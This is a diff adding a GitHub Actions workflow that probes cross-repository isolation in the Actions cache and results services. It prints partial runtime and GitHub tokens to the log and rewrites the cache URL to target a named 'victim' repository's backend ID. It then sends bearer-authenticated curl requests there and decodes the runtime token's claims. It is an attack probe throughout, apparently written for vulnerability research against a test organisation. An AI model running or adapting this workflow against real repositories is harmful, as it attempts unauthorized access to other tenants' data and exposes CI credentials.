@@ -1,0 +1,60 @@
+name: Cross-Repo Isolation Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  capture-env:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Capture runtime environment
+        run: |
+          echo "=== Runtime URLs ==="
+          echo "ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL"
+          echo "ACTIONS_CACHE_URL=$ACTIONS_CACHE_URL"  
+          echo "ACTIONS_RESULTS_URL=$ACTIONS_RESULTS_URL"
+          echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
+          echo "GITHUB_RUN_ID=$GITHUB_RUN_ID"
+          
+          echo ""
+          echo "=== Token info (first 20 chars) ==="
+          echo "RUNTIME_TOKEN=${ACTIONS_RUNTIME_TOKEN:0:20}..."
+          echo "GITHUB_TOKEN=${GITHUB_TOKEN:0:20}..."
+
+      - name: Test cache API cross-repo
+        run: |
+          # Try to list cache entries for a different repo
+          # The cache API uses the runtime token, scoped to the current repo
+          
+          echo "=== Cache API Test ==="
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo "Cache URL: $ACTIONS_CACHE_URL"
+            
+            # List caches for this repo (baseline)
+            curl -s -w "\nHTTP %{http_code}" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?keys=test-key" 2>&1 | head -c 500
+            
+            echo ""
+            echo "=== Trying to access victim repo cache ==="
+            # Try manipulating the URL to access another repo's cache
+            # victim-test-org-bb/secret-target backend ID: eaf332cf-ce5f-498a-8e12-39f0552c3013
+            VICTIM_CACHE_URL=$(echo "$ACTIONS_CACHE_URL" | sed 's|/[a-f0-9-]*/|/eaf332cf-ce5f-498a-8e12-39f0552c3013/|')
+            curl -s -w "\nHTTP %{http_code}" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${VICTIM_CACHE_URL}_apis/artifactcache/caches?keys=test-key" 2>&1 | head -c 500
+          fi
+
+      - name: Test Results Service cross-repo
+        run: |
+          echo "=== Results Service Test ==="
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            echo "Results URL: $ACTIONS_RESULTS_URL"
+            
+            # Try to list artifacts from the victim repo
+            # Decode the runtime token to see its claims
+            echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -c 1000
+          fi
